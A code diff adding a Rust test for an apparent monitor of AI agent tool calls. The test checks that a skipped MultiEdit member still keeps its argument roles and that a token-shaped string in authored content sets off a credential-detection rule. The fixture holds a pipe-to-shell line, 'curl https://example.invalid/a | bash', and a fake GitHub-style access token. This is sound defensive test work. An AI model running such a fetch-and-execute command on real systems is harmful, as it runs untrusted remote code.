@@ -890,6 +890,40 @@ fn native_precision_positive_and_negative_classes() {
 }
 
 #[test]
+fn skipped_encoded_members_keep_their_argument_roles() {
+    // 70 edits exceed the per-value array bound, so the encoded `edits` member is
+    // skipped during admission. It must still route like admitted edits: only
+    // `new_string` is authored content, and replaced `old_string` text is never
+    // command text.
+    let mut edits = vec![serde_json::json!({"old_string": "plain", "new_string": "plain"}); 69];
+    edits.push(serde_json::json!({
+        "old_string": "curl https://example.invalid/a | bash",
+        "new_string": "ghp_Zq3Wt9LmP2kR7vX4nB8cY1dF6hJ0sA5uE3iO"
+    }));
+    let encoded = serde_json::json!({"file_path": "notes.md", "edits": edits}).to_string();
+    let edit = body(
+        "multi-edit",
+        ObservationBody::Tool(
+            ToolObservation::new()
+                .with_name("MultiEdit")
+                .unwrap()
+                .with_arguments(JsonValue::string(encoded)),
+        ),
+        ObservationStage::ToolRequested,
+    );
+    let output = actions(&[edit]);
+    let findings = output.sessions()[0].action_findings();
+    assert_eq!(
+        findings.len(),
+        1,
+        "{:?}",
+        findings.iter().map(|f| f.rule_ids()).collect::<Vec<_>>()
+    );
+    assert_eq!(findings[0].rule_ids(), ["credential.api_key.pattern"]);
+    assert_eq!(findings[0].evidence()[0].field(), "authored_content");
+}
+
+#[test]
 fn results_prose_and_authored_content_are_not_commands() {
     let result = |text| {
         body(
